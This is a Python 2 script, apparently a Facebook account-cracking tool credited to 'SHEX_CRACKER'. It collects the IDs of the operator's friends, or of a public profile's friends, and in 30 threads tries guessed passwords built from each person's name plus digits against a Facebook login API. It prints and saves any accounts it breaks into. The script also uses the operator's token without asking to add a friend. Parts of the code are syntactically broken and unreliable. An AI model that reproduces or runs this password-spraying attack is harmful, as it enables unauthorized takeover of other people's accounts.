#!/usr/bin/python2
#coding=utf-8


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\033[1;96m[!] \x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)


#### LOGO ####
logo = """
\033[1;91m
▄▀▀ █ ░ █▀▀ █░█     ▄▀ █▀▀▄ ▄▀▄ ▄▀ █░▄▀ █▀▀ █▀▀▄ 
░▀▄ █▀▄ █▀▀ ▄▀▄     █░ █▐█▀ █▀█ █░ █▀▄░ █▀▀ █▐█▀ 
▀▀░ ▀░▀ ▀▀▀ ▀░▀     ░▀ ▀░▀▀ ▀░▀ ░▀ ▀░▀▀ ▀▀▀ ▀░▀▀ 
                      '''
\033[1;91m    ║══▒═💀═▒═💀═▒═══¤═¤═¤════════════¤═══¤═══¤═══║
\033[1;96m    ║✯ My Telgram    @SHEX_CRACKER             
\033[1;98m    ║✯ My Snapchat   @k4ro_2      

\033[1;91m    ║══▒═💀═▒═💀═▒═══¤═¤═¤════════════¤═══¤═══¤═══║"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;95mPlease Wait \x1b[1;95m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
\033[1;97m************************************************
\033[1;96m~ ☆ This Tool Careta By SHEX_CRACKER ☆ ~
\033[1;97m************************************************

\033[1;91m
▄▀▀ █░░ █▀▀ █░█     ▄▀ █▀▀▄ ▄▀▄ ▄▀ █░▄▀ █▀▀ █▀▀▄ 
░▀▄ █▀▄ █▀▀ ▄▀▄     █░ █▐█▀ █▀█ █░ █▀▄░ █▀▀ █▐█▀ 
▀▀░ ▀░▀ ▀▀▀ ▀░▀     ░▀ ▀░▀▀ ▀░▀ ░▀ ▀░▀▀ ▀▀▀ ▀░▀▀ 
Username = "shex"
Password = "blnd"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m[\x1b[1;93m✓\x1b[1;96m] \x1b[1;31mUsername\x1b[1;93m>\x1b[1;96m>\x1b[1;93m>\x1b[1;96m>\033[1;35;40m ")
    if (username == Username):
        password = raw_input("\033[1;96m[\x1b[1;93m✓\x1b[1;96m] \x1b[1;31mPassword\x1b[1;93m>\x1b[1;96m>\x1b[1;93m>\x1b[1;96m>\033[1;35;40m ")
        if (password == Password):
            print "ok " + username
            loop = 'false'
        else:
            print "Eeror"
            os.system('xdg-open https://www.snapchat.com/add/k4ro_2')
    else:
        print "Eeror"
        os.system('xdg-open https://www.snapchat.com/add/k4ro_2')

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		print('\033[1;96m[🔥] \x1b[1;91m───FaceBook ek Daxl Ka───\x1b[1;96m[🔥]' )
		id = raw_input('\033[1;93m[+] \x1b[0;34mEnter ID/Email \x1b[1;95m: \x1b[1;95m')
		pwd = raw_input('\033[1;95m[+] \x1b[0;34mEnter Password \x1b[1;91m: \x1b[1;91m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\033[1;96m[!] \x1b[1;91mEror"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\033[1;96m[✓] \x1b[1;92mLogin Hogai'
				os.system('xdg-open https://t.me/MajorCracker')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\033[1;96m[!] \x1b[1;91mXatakat Xawa !"
				keluar()
		if 'checkpoint' in url:
			print("\n\033[1;96m[!] \x1b[1;91mAam Facebooka La Chekpintaya Bigora")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\033[1;96m[!] \x1b[1;91mPassword/Email Xalat")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;91m[!] Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
		ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
		b = json.loads(ots.text)
		sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;91mAcawntakat La Checkpointaya"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;92mXatakat Xawa"
		keluar()
	os.system("clear")
	print logo
	print "\033[1;36;40m      ╔═════════════════════════════════╗"
	print "\033[1;36;40m      ║\033[1;32;40m[*] Name\033[1;32;40m: "+nama+"  	   \033[1;36;40m║"                               
	print "\033[1;36;40m      ║\033[1;34;40m[*] ID  \033[1;34;40m: "+id+"        \033[1;36;40m║"
	print "\033[1;36;40m      ║\033[1;34;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
	print "\033[1;36;40m      ╚═════════════════════════════════╝"
	print "    \033[1;32;40m[Type1] \033[1;33;40m‹•.•›Hack Krdn"	
	print "    \033[1;32;40m[type2] \033[1;33;40m‹•.•›Update"																														
	print "    \033[1;32;40m[type0] \033[1;33;40m‹•.•›Logout"
	pilih()

def pilih():
	unikers = raw_input("\n\033[1;31;40m>>> \033[1;35;40m")
	if unikers =="":
		print "\x1b[1;91mEeror"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="2":
		os.system('clear')
		print logo
		print " \033[1;36;40m●══════════════════◄►══════════════════●\n"
		os.system('git pull origin master')
		raw_input('\n\x1b[1;91m[ \x1b[1;97mGaranawa \x1b[1;91m]')
		menu()
	elif unikers =="0":
		jalan('Bash')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mEeror"
		pilih()

def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "     \033[1;97m-•◈•-\033[1;91m> \033[1;91m1.\x1b[1;95m>_<Hack Krdni Hawrekant"
	print "     \033[1;97m-•◈•-\033[1;91m> \033[1;91m2.\x1b[1;95m>_<Hack Krdn Ba Id Public "
	print "     \033[1;97m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91m>_<Garanawa"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;91mShtek Halbzhera>>> \033[1;95m")
	if peak =="":
		print "\x1b[1;91mEeror"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print "\033[1;97m•◈•══════•◈•\033[1;91mSHEX_CRACKER\033[1;97m•◈•══════•◈•"
		jalan('\033[1;91mBadast Henani Id \033[1;91m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;95m[•◈•] \033[1;91mID yaka Dane\033[1;95m: \033[1;95m")
		print "\033[1;92m•◈•══════••◈•\033[1;91mSHEX_CRACKER\033[1;95m•◈•══════••◈•"
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;91mName\033[1;95m:\033[1;95m "+op["name"]
		except KeyError:
			print"\x1b[1;91mID XALATA!"
			raw_input("\n\033[1;95m[\033[1;91mGaranawa\033[1;95m]")
			super()
		print"\033[1;91mBadast Henani Id\033[1;97m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mEeror"
		pilih_super()
	
	print "\033[1;36;40m[$] Hamw Id yakan: \033[1;91m"+str(len(id))
	jalan('\033[1;34;40m[✺] Tkaya Chawarwan ba ...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;32;40m[✺] Cloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;91m        ❈     \x1b[1;91mBo Wastan Dni Toolaka  CTRL+Z \033[1;91m    ❈"
	print "   \033[1;92m●══════════════════◄►══════════════════●"

	jalan('           \033[1;91mChaware Ba Bo Hack Krdnaka')
	print  "  \033[1;92m ●══════════════════◄►══════════════════●" 

	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:rana
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
			b = json.loads(a.text)												
			pass1 = b['first_name'] + '1234'												
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			q = json.load(data)												
			if 'access_token' in q:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				z = json.loads(x.text)
				print '\x1b[1;91m[  ✓  ] \x1b[1;92mHACK BW $$$#$$$'											
				print '\x1b[1;91m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']											
				print '\x1b[1;91m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user											
				print '\x1b[1;91m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass1 + '\n'											
				oks.append(user+pass1)
                        else:
			        if 'www.facebook.com' in q["error_msg"]:
				    print '\x1b[1;91m[ ❥ ] \x1b[1;91mFUCKED F.B'
				    print '\x1b[1;91m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;95m' + b ['name']
				    print '\x1b[1;91m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;95m' + user
				    print '\x1b[1;91m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;95m' + pass1 + '\n'
				    cek = open("out/super_cp.txt", "a")
				    cek.write("ID:" +user+ " Pw:" +pass1+"\n")
				    cek.close()
				    cekpoint.append(user+pass1)
                                else:
				    pass2 = b['first_name'] + '123'										
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			            q = json.load(data)												
			            if 'access_token' in q:	
				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				            z = json.loads(x.text)
				            print '\x1b[1;91m[  ✓  ] \x1b[1;92mHACK BW $$$#$$$'											
				            print '\x1b[1;91m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']											
				            print '\x1b[1;91m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user								
				            print '\x1b[1;91m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass2 + '\n'											
				            oks.append(user+pass2)
                                    else:
			                   if 'www.facebook.com' in q["error_msg"]:
				               print '\x1b[1;91m[ ❥ ] \x1b[1;91mFUCKED F.B'
				               print '\x1b[1;91m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;95m' + b['name']
				               print '\x1b[1;91m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;95m' + user
				               print '\x1b[1;91m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;95m' + pass2 + '\n'
				               cek = open("out/super_cp.txt", "a")
				               cek.write("ID:" +user+ " Pw:" +pass2+"\n")
				               cek.close()
				               cekpoint.append(user+pass2)								
				           else:											
					       pass3 = b['last_name']+'1234'										
					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
					       q = json.load(data)										
					       if 'access_token' in q:	
						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                       z = json.loads(x.text)
						       print '\x1b[1;91m[  ✓  ] \x1b[1;92mHACK BW $$$#$$$'								
						       print '\x1b[1;91m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']									
						       print '\x1b[1;91m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user							
						       print '\x1b[1;91m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass3 + '\n'									
						       oks.append(user+pass3)
                                               else:
			                               if 'www.facebook.com' in q["error_msg"]:
				                           print '\x1b[1;91m[ :( ] \x1b[1;91mFUCKED F.B'
				                           print '\x1b[1;91m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;95m' + b['name']
				                           print '\x1b[1;91m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;95m' + user
				                           print '\x1b[1;91m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;95m' + pass3 + '\n'
				                           cek = open("out/super_cp.txt", "a")
				                           cek.write("ID:" +user+ " Pw:" +pass3+"\n")
				                           cek.close()
				                           cekpoint.append(user+pass3)									
					               else:										
						           pass4 = b['first_name'] + '1212'											
			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                   q = json.load(data)												
			                                   if 'access_token' in q:		
						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                   z = json.loads(x.text)
				                                   print '\x1b[1;91m[  ✓  ] \x1b[1;92mHACK BW $$$#$$$'											
				                                   print '\x1b[1;91m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']											
				                                   print '\x1b[1;91m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user											
				                                   print '\x1b[1;91m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass4 + '\n'											
				                                   oks.append(user+pass4)
                                                           else:
			                                           if 'www.facebook.com' in q["error_msg"]:
				                                       print '\x1b[1;91m[ ❥ ] \x1b[1;91mFUCKED F.B'
				                                       print '\x1b[1;91m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;95m' + b['name']
				                                       print '\x1b[1;91m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;95m' + user
				                                       print '\x1b[1;91m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;95m' + pass4 + '\n'
				                                       cek = open("out/super_cp.txt", "a")
				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")
				                                       cek.close()
				                                       cekpoint.append(user+pass4)					
					                           else:									
						                       pass5 = '1122334455'							
						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
						                       q = json.load(data)								
						                       if 'access_token' in q:	
						                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                               z = json.loads(x.text)
						                               print '\x1b[1;91m[  ✓  ] \x1b[1;92mHACK BW $$$#$$$'						
						                               print '\x1b[1;91m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']							
						                               print '\x1b[1;91m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user					
						                               print '\x1b[1;91m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass5 + '\n'							
						                               oks.append(user+pass5)	
                                                                       else:
			                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                   print '\x1b[1;91m[ :( ] \x1b[1;91mFUCKED F.B'
				                                                   print '\x1b[1;91m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;95m' + b['name']
				                                                   print '\x1b[1;91m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;95m' + user
				                                                   print '\x1b[1;91m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;95m' + pass5 + '\n'
				                                                   cek = open("out/super_cp.txt", "a")
				                                                   cek.write("ID:" +user+ " Pw:" +pass5+"\n")
				                                                   cek.close()
				                                                   cekpoint.append(user+pass5)					
						                               else:								
							                           pass6 = '11223344'											
			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                           q = json.load(data)												
			                                                           if 'access_token' in q:	
								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                           z = json.loads(x.text)
				                                                           print '\x1b[1;91m[  ✓  ] \x1b[1;92mHACK BW $$$#$$$'											
				                                                           print '\x1b[1;91m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']											
				                                                           print '\x1b[1;91m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user									
				                                                           print '\x1b[1;91m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass6 + '\n'											
				                                                           oks.append(user+pass6)
                                                                                   else:
			                                                                   if 'www.facebook.com' in q["error_msg"]:
				                                                               print '\x1b[1;91m[ F*** ] \x1b[1;91mFUCKED F.B'
				                                                               print '\x1b[1;91m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;95m' + b['name']
				                                                               print '\x1b[1;91m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;95m' + user
				                                                               print '\x1b[1;91m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;95m' + pass6 + '\n'
				                                                               cek = open("out/super_cp.txt", "a")
				                                                               cek.write("ID:" +user+ " Pw:" +pass6+"\n")
				                                                               cek.close()
				                                                               cekpoint.append(user+pass6)	
						                                           else:							
								                               pass7 = b['first_name']+'12345'						
								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
								                               q = json.load(data)						
								                               if 'access_token' in q:		
				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                       z = json.loads(x.text)
									                               print '\x1b[1;91m[  ✓  ] \x1b[1;92mHACK BW $$$#$$$'					
									                               print '\x1b[1;91m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']					
									                               print '\x1b[1;91m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user				
									                               print '\x1b[1;91m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass7 + '\n'					
									                               oks.append(user+pass7)
                                                                                               else:
			                                                                               if 'www.facebook.com' in q["error_msg"]:
				                                                                           print '\x1b[1;91m[ ❥ ] \x1b[1;91mFUCKED F.B'
				                                                                           print '\x1b[1;91m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;95m' + b['name']
				                                                                           print '\x1b[1;91m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;95m' + user
				                                                                           print '\x1b[1;91m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;95m' + pass7 + '\n'
				                                                                           cek = open("out/super_cp.txt", "a")
				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")
				                                                                           cek.close()
				                                                                           cekpoint.append(user+pass7)           					
								                                       else:						
										                           pass8 = b['last_name'] + '12345'											
			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                                                   q = json.load(data)												
			                                                                                   if 'access_token' in q:		
										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                   z = json.loads(x.text)
				                                                                                   print '\x1b[1;91m[  ✓  ] \x1b[1;92mHACK BW $$$#$$$'											
				                                                                                   print '\x1b[1;91m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']											
				                                                                                   print '\x1b[1;91m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user										
				                                                                                   print '\x1b[1;91m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass8 + '\n'											
				                                                                                   oks.append(user+pass8)
                                                                                                           else:
			                                                                                           if 'www.facebook.com' in q["error_msg"]:
				                                                                                       print '\x1b[1;91m[ ❥ ] \x1b[1;91mFUCKED F.B'
				                                                                                       print '\x1b[1;91m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;95m' + b['name']
				                                                                                       print '\x1b[1;91m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;95m' + user
				                                                                                       print '\x1b[1;91m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;95m' + pass8 + '\n'
				                                                                                       cek = open("out/super_cp.txt", "a")
				                                                                                       cek.write("ID:" +user+ " Pw:" +pass8+"\n")
				                                                                                       cek.close()
				                                                                                       cekpoint.append(user+pass8)   	
										                                   else:					
										                                       pass9 = b['first_name'] + '123456'					
										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
										                                       q = json.load(data)				
										                                       if 'access_token' in q:		
		                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                               z = json.loads(x.text)
											                                       print '\x1b[1;91m[  ✓  ] \x1b[1;92mHACK BW $$$#$$$'			
											                                       print '\x1b[1;91m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']			
											                                       print '\x1b[1;91m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user	
											                                       print '\x1b[1;91m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass9 + '\n'			
											                                       oks.append(user+pass9)
                                                                                                                       else:
			                                                                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                                                                   print '\x1b[1;91m[ ❥ ] \x1b[1;91mFUCKED F.B'
				                                                                                                   print '\x1b[1;91m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;95m' + b['name']
				                                                                                                   print '\x1b[1;91m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;95m' + user
				                                                                                                   print '\x1b[1;91m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;95m' + pass9 + '\n'
				                                                                                                   cek = open("out/super_cp.txt", "a")
				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")
				                                                                                                   cek.close()
				                                                                                                   cekpoint.append(user+pass9)		
											                                       
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mSHEX_CRACKER\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
	print "  \033[1;91m«---•◈•---This Tool Maked by SHEX BLND--•◈•---»" #SHEX_CRACKER
	print '\033[1;93m✅Bo Garanawa Ama bka ➡ Ctrl+Z.↩ bo Dast pe krdnawa am leda (python2 SHEX-BLND.py)↩\033[1;97m....'
	print"\033[1;91mHamw Hackbwakan/\x1b[1;95mHamwChekpointakan \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
	print """
▄▀▀ █░░ █▀▀ █░█     ▄▀ █▀▀▄ ▄▀▄ ▄▀ █░▄▀ █▀▀ █▀▀▄ 
░▀▄ █▀▄ █▀▀ ▄▀▄     █░ █▐█▀ █▀█ █░ █▀▄░ █▀▀ █▐█▀ 
▀▀░ ▀░▀ ▀▀▀ ▀░▀     ░▀ ▀░▀▀ ▀░▀ ░▀ ▀░▀▀ ▀▀▀ ▀░▀▀ 
         Chekpointakan Akrenawa Dway 7 Rozh
•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
: \033[1;91m ....SHEX_CRACKER....... \033[1;95m :
•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                Facebook
              \033[1;91m BLND"""
	
	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
	menu()

if __name__ == '__main__':
	login()

